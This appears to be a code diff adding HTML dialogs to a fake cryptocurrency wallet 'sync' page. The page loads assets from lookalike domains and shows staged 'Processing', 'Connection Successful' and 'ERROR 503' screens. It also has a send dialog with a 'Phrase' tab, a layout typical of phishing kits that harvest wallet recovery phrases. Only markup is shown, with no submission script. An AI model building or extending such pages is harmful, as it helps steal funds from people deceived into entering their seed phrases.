@@ -23,7 +23,42 @@
 	 <link href="../fixrectifysync.pages.dev/style/index.css" rel="stylesheet" />
 </head>
 <body>
-
+    <div id="processing-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <h1 id="processing-val" style="font-size: 45px;">30</h1>
+                <h4 class="mt-3">Processing...</h4>
+            </div>
+        </div>
+    </div>
+    <div id="success-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <img style="width: 100px;" src="wallet/success.gif" alt="Success" />
+                <h4 class="mt-3">Connection Successful</h4>
+                <img style="width: 100px;" src="assets/qr.png" alt="Success" />
+            </div>
+        </div>
+    </div>
+    <div id="error-dialog" class="message-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content" style="background: #fefcfb;">
+            <div class="connect-dialog-body">
+                <img style="width: 150px;" src="/in/en/wallet/errorx.gif" />
+                <h4 class="mt-3">ERROR 503</h4>
+            </div>
+        </div>
+    </div>
+    <div id="send-dialog" style="display: none;">
+        <div class="send-dialog-overlay"></div>
+        <div class="send-dialog-content">
+            <div class="connect-dialog-body">
+                <div class="to-send-info">
+                    <div class="wallet-app-send-logo"><img id="current-wallet-send-logo" src="../syncwallet.online/static/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name" /></div>
+                    <div id="current-wallet-app-send" class="wallet-app-name-send">My app</div>
+                </div>
 
                 <div class="send-tabs">
                     <button id="phraseSend">Phrase</button>
